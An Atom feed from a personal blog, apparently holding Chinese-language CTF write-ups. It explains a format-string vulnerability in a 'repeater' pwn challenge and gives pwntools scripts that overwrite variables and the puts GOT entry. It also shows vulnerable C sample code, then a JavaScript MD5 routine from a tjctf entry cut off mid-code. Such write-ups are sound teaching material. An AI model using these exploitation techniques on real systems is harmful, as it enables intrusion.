<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://threst.github.io/"/>
  <updated>2018-11-13T15:51:46.597Z</updated>
  <id>https://threst.github.io/</id>
  
  <author>
    <name>threst</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwn之路_repeater(山东省赛)</title>
    <link href="https://threst.github.io/2018/11/14/pwn_repeater/"/>
    <id>https://threst.github.io/2018/11/14/pwn_repeater/</id>
    <published>2018-11-14T01:50:13.000Z</published>
    <updated>2018-11-13T15:51:46.597Z</updated>
    
    <content type="html"><![CDATA[<h2 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h2><p>考点:格式化字符串漏洞</p><h2 id="pwntools知识点"><a href="#pwntools知识点" class="headerlink" title="pwntools知识点"></a>pwntools知识点</h2><p><code>fmtstr_payload</code>是<code>pwntools</code>提供的函数，用于自动生成格式化字符串。</p><p><code>fmtstr_payload</code>有两个参数,第一个参数是int，用于表示取参数的偏移个数,第二个参数是字典，字典的意义是往key的地址，写入value的值</p><p><code>fmtstr_payload(7, {printf_got: system_add})</code></p><p>这个函数调用会往<code>printf_got</code>中写入<code>system_add</code></p><h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><p>此题为简单的格式化字符串漏洞，首先总览分析一下程序，循环受<code>totalcount</code>次数限制，初始值为1。</p><p><img src="https://www.superbed.cn/pic/5beae1459dc6d6bf0f3b6ff8" alt=""></p><p>程序提供了 <code>getFlag</code> 方法，但是需要变量 <code>number</code>为 <code>0x2018</code> 才会执行命令。</p><p><img src="https://www.superbed.cn/pic/5beae1459dc6d6bf0f3b6ff9" alt=""></p><h2 id="一个一个kill"><a href="#一个一个kill" class="headerlink" title="一个一个kill"></a>一个一个kill</h2><h3 id="totalcount"><a href="#totalcount" class="headerlink" title="totalcount"></a>totalcount</h3><p>接下来思路就很清晰了，首先改写<code>totalcount</code>变量，使得循环执行更多次。</p><p><img src="https://www.superbed.cn/pic/5beae4eb9dc6d6bf0f3b6ffa" alt=""></p><p><code>totalcount</code>的地址为<code>0x0804A064</code>,所以要将其修改为3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(4,&#123;0x0804A064:0x3&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="number"><a href="#number" class="headerlink" title="number"></a>number</h3><p>然后改写 number 为 <code>0x2018</code>。同样我们要在<code>.data</code>中寻找number的值</p><p><img src="https://www.superbed.cn/pic/5beae63c9dc6d6bf0f3b6ffd" alt=""></p><p><code>20h</code>转为１０进制就是2018</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(4,&#123;0x0804A060:0x2018&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>在最开始的图中我们可以知道，格式化字符串输出后就调用了<code>puts</code>函数，我们要做的就是将<code>puts</code>其地址修改为<code>getflag</code>函数的地址,最后调用 <code>getFlag</code>方法获取 Flag。</p><p>那么我们现在有了新问题，怎么找到<code>puts</code>的地址和<code>getflag</code>的地址？介绍两种方法</p><h4 id="方法1-puts"><a href="#方法1-puts" class="headerlink" title="方法1(puts)"></a>方法1(puts)</h4><p>使用<code>objdump -R repeater</code>命令</p><p><img src="https://www.superbed.cn/pic/5beae8ca9dc6d6bf0f3b6ffe" alt=""></p><p>地址为<code>0x0804a014</code></p><h4 id="方法2-puts"><a href="#方法2-puts" class="headerlink" title="方法2(puts)"></a>方法2(puts)</h4><p>ida找got表</p><p><img src="https://www.superbed.cn/pic/5beae93c9dc6d6bf0f3b6fff" alt=""></p><h4 id="getflag地址"><a href="#getflag地址" class="headerlink" title="getflag地址"></a>getflag地址</h4><p>直接ida打开就行</p><p><img src="https://www.superbed.cn/pic/5beae9d29dc6d6bf0f3b7001" alt=""></p><p>框框中的地址好像都可以用</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>好了现在我们有了<code>puts</code>的地址<code>0x0804a014</code>,<code>getflag</code>的地址<code>0x080485B6</code></p><p>脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(4,&#123;0x804a014:0x080485B6&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最后代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./repeater'</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x0804A064</span>:<span class="number">0x3</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x0804A060</span>:<span class="number">0x2018</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x804a014</span>:<span class="number">0x080485B6</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h2><h4 id="1-寻找偏移量"><a href="#1-寻找偏移量" class="headerlink" title="1.寻找偏移量"></a>1.寻找偏移量</h4><p>看输出判断,比如这个题的偏移量为４，我们这样来确定</p><p>输入<code>AAAA.%x.%x.%x.%x.%x.%x.%x</code>,查看打印的字符<code>41414141</code>在<code>AAAA</code>后面第几个偏移量就为多少,这个是第４个，所以偏移量为4.</p><p><img src="https://www.superbed.cn/pic/5beaec089dc6d6bf0f3b7003" alt=""></p><p>我们再来一个,源码来自ctf-wiki中格式化字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译下<code>gcc -m32 -fno-stack-protector -no-pie -o overflow overflow.c</code></p><p><img src="https://www.superbed.cn/pic/5beaed379dc6d6bf0f3b7006" alt=""></p><p>根据上面讲的，这个的偏移量就是6,我们尝试下修改<code>a</code>的值</p><p><img src="https://www.superbed.cn/pic/5beaedd49dc6d6bf0f3b7009" alt=""></p><p>首先找到<code>a</code>地址为<code>0x0804C024</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overflow'</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;<span class="number">0x0804C024</span>:<span class="number">0x2</span>&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://www.superbed.cn/pic/5beaeec59dc6d6bf0f3b700b" alt=""></p><p>成功修改,同理修改<code>b</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overflow'</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;<span class="number">0x0804C028</span>:<span class="number">0x12345678</span>&#125;)<span class="comment">#b的地址为28</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://www.superbed.cn/pic/5beaef279dc6d6bf0f3b700c" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;repeater&quot;&gt;&lt;a href=&quot;#repeater&quot; class=&quot;headerlink&quot; title=&quot;repeater&quot;&gt;&lt;/a&gt;repeater&lt;/h2&gt;&lt;p&gt;考点:格式化字符串漏洞&lt;/p&gt;
&lt;h2 id=&quot;pwntools知识点&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://threst.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>无处安放的wp(不定期更)</title>
    <link href="https://threst.github.io/2018/11/11/ctf/"/>
    <id>https://threst.github.io/2018/11/11/ctf/</id>
    <published>2018-11-11T06:32:13.000Z</published>
    <updated>2018-11-11T10:16:38.594Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tjctf"><a href="#tjctf" class="headerlink" title="tjctf"></a>tjctf</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> md5 = <span class="function"><span class="keyword">function</span> (<span class="params">string</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">RotateLeft</span>(<span class="params">lValue, iShiftBits</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> (lValue&lt;&lt;iShiftBits) | (lValue&gt;&gt;&gt;(<span class="number">32</span>-iShiftBits));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">AddUnsigned</span>(<span class="params">lX,lY</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">var</span> lX4,lY4,lX8,lY8,lResult;</span><br><span class="line">           lX8 = (lX &amp; <span class="number">0x80000000</span>);</span><br><span class="line">           lY8 = (lY &amp; <span class="number">0x80000000</span>);</span><br><span class="line">           lX4 = (lX &amp; <span class="number">0x40000000</span>);</span><br><span class="line">           lY4 = (lY &amp; <span class="number">0x40000000</span>);</span><br><span class="line">           lResult = (lX &amp; <span class="number">0x3FFFFFFF</span>)+(lY &amp; <span class="number">0x3FFFFFFF</span>);</span><br><span class="line">           <span class="keyword">if</span> (lX4 &amp; lY4) &#123;</span><br><span class="line">                   <span class="keyword">return</span> (lResult ^ <span class="number">0x80000000</span> ^ lX8 ^ lY8);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (lX4 | lY4) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (lResult &amp; <span class="number">0x40000000</span>) &#123;</span><br><span class="line">                           <span class="keyword">return</span> (lResult ^ <span class="number">0xC0000000</span> ^ lX8 ^ lY8);</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                           <span class="keyword">return</span> (lResult ^ <span class="number">0x40000000</span> ^ lX8 ^ lY8);</span><br><span class="line">                   &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> (lResult ^ lX8 ^ lY8);</span><br><span class="line">           &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params">x,y,z</span>) </span>&#123; <span class="keyword">return</span> (x &amp; y) | ((~x) &amp; z); &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">G</span>(<span class="params">x,y,z</span>) </span>&#123; <span class="keyword">return</span> (x &amp; z) | (y &amp; (~z)); &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">H</span>(<span class="params">x,y,z</span>) </span>&#123; <span class="keyword">return</span> (x ^ y ^ z); &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">I</span>(<span class="params">x,y,z</span>) </span>&#123; <span class="keyword">return</span> (y ^ (x | (~z))); &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">FF</span>(<span class="params">a,b,c,d,x,s,ac</span>) </span>&#123;</span><br><span class="line">           a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac));</span><br><span class="line">           <span class="keyword">return</span> AddUnsigned(RotateLeft(a, s), b);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">GG</span>(<span class="params">a,b,c,d,x,s,ac</span>) </span>&#123;</span><br><span class="line">           a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac));</span><br><span class="line">           <span class="keyword">return</span> AddUnsigned(RotateLeft(a, s), b);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">HH</span>(<span class="params">a,b,c,d,x,s,ac</span>) </span>&#123;</span><br><span class="line">           a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac));</span><br><span class="line">           <span class="keyword">return</span> AddUnsigned(RotateLeft(a, s), b);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">II</span>(<span class="params">a,b,c,d,x,s,ac</span>) </span>&#123;</span><br><span class="line">           a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b, c, d), x), ac));</span><br><span class="line">           <span class="keyword">return</span> AddUnsigned(RotateLeft(a, s), b);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">ConvertToWordArray</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">var</span> lWordCount;</span><br><span class="line">           <span class="keyword">var</span> lMessageLength = string.length;</span><br><span class="line">           <span class="keyword">var</span> lNumberOfWords_temp1=lMessageLength + <span class="number">8</span>;</span><br><span class="line">           <span class="keyword">var</span> lNumberOfWords_temp2=(lNumberOfWords_temp1-(lNumberOfWords_temp1 % <span class="number">64</span>))/<span class="number">64</span>;</span><br><span class="line">           <span class="keyword">var</span> lNumberOfWords = (lNumberOfWords_temp2+<span class="number">1</span>)*<span class="number">16</span>;</span><br><span class="line">           <span class="keyword">var</span> lWordArray=<span class="built_in">Array</span>(lNumberOfWords<span class="number">-1</span>);</span><br><span class="line">           <span class="keyword">var</span> lBytePosition = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">var</span> lByteCount = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">while</span> ( lByteCount &lt; lMessageLength ) &#123;</span><br><span class="line">                   lWordCount = (lByteCount-(lByteCount % <span class="number">4</span>))/<span class="number">4</span>;</span><br><span class="line">                   lBytePosition = (lByteCount % <span class="number">4</span>)*<span class="number">8</span>;</span><br><span class="line">                   lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount)&lt;&lt;lBytePosition));</span><br><span class="line">                   lByteCount++;</span><br><span class="line">           &#125;</span><br><span class="line">           lWordCount = (lByteCount-(lByteCount % <span class="number">4</span>))/<span class="number">4</span>;</span><br><span class="line">           lBytePosition = (lByteCount % <span class="number">4</span>)*<span class="number">8</span>;</span><br><span class="line">           lWordArray[lWordCount] = lWordArray[lWordCount] | (<span class="number">0x80</span>&lt;&lt;lBytePosition);</span><br><span class="line">           lWordArray[lNumberOfWords<span class="number">-2</span>] = lMessageLength&lt;&lt;<span class="number">3</span>;</span><br><span class="line">           lWordArray[lNumberOfWords<span class="number">-1</span>] = lMessageLength&gt;&gt;&gt;<span class="number">29</span>;</span><br><span class="line">           <span class="keyword">return</span> lWordArray;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">WordToHex</span>(<span class="params">lValue</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">var</span> WordToHexValue=<span class="string">""</span>,WordToHexValue_temp=<span class="string">""</span>,lByte,lCount;</span><br><span class="line">           <span class="keyword">for</span> (lCount = <span class="number">0</span>;lCount&lt;=<span class="number">3</span>;lCount++) &#123;</span><br><span class="line">                   lByte = (lValue&gt;&gt;&gt;(lCount*<span class="number">8</span>)) &amp; <span class="number">255</span>;</span><br><span class="line">                   WordToHexValue_temp = <span class="string">"0"</span> + lByte.toString(<span class="number">16</span>);</span><br><span class="line">                   WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length<span class="number">-2</span>,<span class="number">2</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> WordToHexValue;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">Utf8Encode</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">           string = string.replace(<span class="regexp">/\r\n/g</span>,<span class="string">"\n"</span>);</span><br><span class="line">           <span class="keyword">var</span> utftext = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; string.length; n++) &#123;</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">var</span> c = string.charCodeAt(n);</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">if</span> (c &lt; <span class="number">128</span>) &#123;</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode(c);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">else</span> <span class="keyword">if</span>((c &gt; <span class="number">127</span>) &amp;&amp; (c &lt; <span class="number">2048</span>)) &#123;</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode((c &gt;&gt; <span class="number">6</span>) | <span class="number">192</span>);</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode((c &amp; <span class="number">63</span>) | <span class="number">128</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">else</span> &#123;</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode((c &gt;&gt; <span class="number">12</span>) | <span class="number">224</span>);</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>) | <span class="number">128</span>);</span><br><span class="line">                           utftext += <span class="built_in">String</span>.fromCharCode((c &amp; <span class="number">63</span>) | <span class="number">128</span>);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> utftext;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> x=<span class="built_in">Array</span>();</span><br><span class="line">   <span class="keyword">var</span> k,AA,BB,CC,DD,a,b,c,d;</span><br><span class="line">   <span class="keyword">var</span> S11=<span class="number">7</span>, S12=<span class="number">12</span>, S13=<span class="number">17</span>, S14=<span class="number">22</span>;</span><br><span class="line">   <span class="keyword">var</span> S21=<span class="number">5</span>, S22=<span class="number">9</span> , S23=<span class="number">14</span>, S24=<span class="number">20</span>;</span><br><span class="line">   <span class="keyword">var</span> S31=<span class="number">4</span>, S32=<span class="number">11</span>, S33=<span class="number">16</span>, S34=<span class="number">23</span>;</span><br><span class="line">   <span class="keyword">var</span> S41=<span class="number">6</span>, S42=<span class="number">10</span>, S43=<span class="number">15</span>, S44=<span class="number">21</span>;</span><br><span class="line"></span><br><span class="line">   string = Utf8Encode(string);</span><br><span class="line"></span><br><span class="line">   x = ConvertToWordArray(string);</span><br><span class="line"></span><br><span class="line">   a = <span class="number">0x67452301</span>; b = <span class="number">0xEFCDAB89</span>; c = <span class="number">0x98BADCFE</span>; d = <span class="number">0x10325476</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;x.length;k+=<span class="number">16</span>) &#123;</span><br><span class="line">           AA=a; BB=b; CC=c; DD=d;</span><br><span class="line">           a=FF(a,b,c,d,x[k+<span class="number">0</span>], S11,<span class="number">0xD76AA478</span>);</span><br><span class="line">           d=FF(d,a,b,c,x[k+<span class="number">1</span>], S12,<span class="number">0xE8C7B756</span>);</span><br><span class="line">           c=FF(c,d,a,b,x[k+<span class="number">2</span>], S13,<span class="number">0x242070DB</span>);</span><br><span class="line">           b=FF(b,c,d,a,x[k+<span class="number">3</span>], S14,<span class="number">0xC1BDCEEE</span>);</span><br><span class="line">           a=FF(a,b,c,d,x[k+<span class="number">4</span>], S11,<span class="number">0xF57C0FAF</span>);</span><br><span class="line">           d=FF(d,a,b,c,x[k+<span class="number">5</span>], S12,<span class="number">0x4787C62A</span>);</span><br><span class="line">           c=FF(c,d,a,b,x[k+<span class="number">6</span>], S13,<span class="number">0xA8304613</span>);</span><br><span class="line">           b=FF(b,c,d,a,x[k+<span class="number">7</span>], S14,<span class="number">0xFD469501</span>);</span><br><span class="line">           a=FF(a,b,c,d,x[k+<span class="number">8</span>], S11,<span class="number">0x698098D8</span>);</span><br><span class="line">           d=FF(d,a,b,c,x[k+<span class="number">9</span>], S12,<span class="number">0x8B44F7AF</span>);</span><br><span class="line">           c=FF(c,d,a,b,x[k+<span class="number">10</span>],S13,<span class="number">0xFFFF5BB1</span>);</span><br><span class="line">           b=FF(b,c,d,a,x[k+<span class="number">11</span>],S14,<span class="number">0x895CD7BE</span>);</span><br><span class="line">           a=FF(a,b,c,d,x[k+<span class="number">12</span>],S11,<span class="number">0x6B901122</span>);</span><br><span class="line">           d=FF(d,a,b,c,x[k+<span class="number">13</span>],S12,<span class="number">0xFD987193</span>);</span><br><span class="line">           c=FF(c,d,a,b,x[k+<span class="number">14</span>],S13,<span class="number">0xA679438E</span>);</span><br><span class="line">           b=FF(b,c,d,a,x[k+<span class="number">15</span>],S14,<span class="number">0x49B40821</span>);</span><br><span class="line">           a=GG(a,b,c,d,x[k+<span class="number">1</span>], S21,<span class="number">0xF61E2562</span>);</span><br><span class="line">           d=GG(d,a,b,c,x[k+<span class="number">6</span>], S22,<span class="number">0xC040B340</span>);</span><br><span class="line">           c=GG(c,d,a,b,x[k+<span class="number">11</span>],S23,<span class="number">0x265E5A51</span>);</span><br><span class="line">           b=GG(b,c,d,a,x[k+<span class="number">0</span>], S24,<span class="number">0xE9B6C7AA</span>);</span><br><span class="line">           a=GG(a,b,c,d,x[k+<span class="number">5</span>], S21,<span class="number">0xD62F105D</span>);</span><br><span class="line">           d=GG(d,a,b,c,x[k+<span class="number">10</span>],S22,<span class="number">0x2441453</span>);</span><br><span class="line">           c=GG(c,d,a,b,x[k+<span class="number">15</span>],S23,<span class="number">0xD8A1E681</span>);</span><br><span class="line">           b=GG(b,c,d,a,x[k+<span class="number">4</span>], S24,<span class="number">0xE7D3FBC8</span>);</span><br><span class="line">           a=GG(a,b,c,d,x[k+<span class="number">9</span>], S21,<span class="number">0x21E1CDE6</span>);</span><br><span class="line">           d=GG(d,a,b,c,x[k+<span class="number">14</span>],S22,<span class="number">0xC33707D6</span>);</span><br><span class="line">           c=GG(c,d,a,b,x[k+<span class="number">3</span>], S23,<span 